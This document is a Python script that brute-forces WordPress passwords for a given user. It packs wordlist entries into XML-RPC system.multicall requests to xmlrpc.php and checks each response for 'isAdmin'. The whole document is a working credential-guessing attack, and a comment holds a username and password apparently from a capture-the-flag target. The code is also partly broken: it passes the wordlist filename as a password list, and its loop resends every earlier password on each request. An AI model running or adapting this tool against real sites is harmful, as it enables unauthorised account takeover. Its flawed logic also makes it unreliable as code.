import requests
import sys
from html import escape as esc 

# Reference: https://github.com/kavishgr/xmlrpc-bruteforcer/blob/master/xmlrpcbruteforce.py

# Insert the IP address containing which has the XMLrpc.php page stored and then send a get request to it.
def verify_target(ip):
    target_url = "http://%s/xmlrpc.php" % (ip)
    send_req = requests.post(target_url)
    send_req_status = send_req.status_code
    if send_req_status == 200 or send_req.text == "XML-RPC server accepts POST requests only.":
        print("Found XML-RPC... Proceeding to attack")

    return target_url

def show_xmlrpc_options(url):
    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
    headers = {'Content-Type': "application/xml"}
    req = requests.post(url, data=xmlrpc_methods, headers=headers)

    return req.text

def check_for_calls(url, xml_options):
    payload_check = show_xmlrpc_options(url)
    if "system.multicall" in payload_check and "wp.getUsersBlogs" in payload_check:
        print("All calls are here, ready to proceed")
    else:
        # In case of an issue we'd get this error
        sys.exit("Missing calls for brute force attack, can't go on :(")

# Send this payload numerous times using the system.multicall to bruteforce the passwords for a given user
def brute_xmlrpc_payload(target_url, user, passwords):
    payload_prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    payload_body = ""
    payload_suffix = "</data></array></value></param></params></methodCall>"

    for password in passwords:
        payload_body += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
        payload_body += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
        payload_body += "</data></array></value></data></array></value></member></struct></value>"

    data = payload_prefix + payload_body + payload_suffix
    headers = {"Content-Type": "application/xml"}
    req = requests.post(target_url, data=data, headers=headers)
    req.encoding = 'UTF-8'
    return req.text

def bruteforce(wordlist):
    
    with open(wordlist) as f:
        lines = f.readlines()
        print(lines)


def main():
    # IP address is available as a command line argument
    target_ip = sys.argv[1]
    # Wordlist which is available to be used 
    wordlist = sys.argv[2]
    # Username associated to the Wordpress site
    username = sys.argv[3]
    
    # List in which the password is stored
    passwords = []
    # Ensure the target is actually available and we're not just attacking an endpoint which cannot be reached
    target = verify_target(target_ip)
    print("Target url: %s" % target)
    
    options = show_xmlrpc_options(target)
    print("XMLRPC options: %s" % options)

    check_for_calls(target, options)

    # This payload contains correct credentials so we want to reach this result with a loop eventually

    print("Performing XMLRPC sys.multicall brute force.......\n")

    # We want a payload in which we can provide a username
    authenticated_payload = brute_xmlrpc_payload(target, f"{username}", wordlist)
    #unauthenticated_payload = brute_xmlrpc_payload(target, "elliot", 'ER28-065')

    #print("Authenticated payload: %s" % authenticated_payload)
    #print(unauthenticated_payload)

    
    with open(wordlist, encoding="ISO-8859-1") as f:
        for line in f:
            passwords.append(line.rstrip())
            response = brute_xmlrpc_payload(target, f'{username}', passwords)
            if "isAdmin" not in response:
                print("Nothing yet")
            elif "isAdmin" in response:
                print(f"Found password: {line}")
                sys.exit(0)
            else:
                pass
    

main()
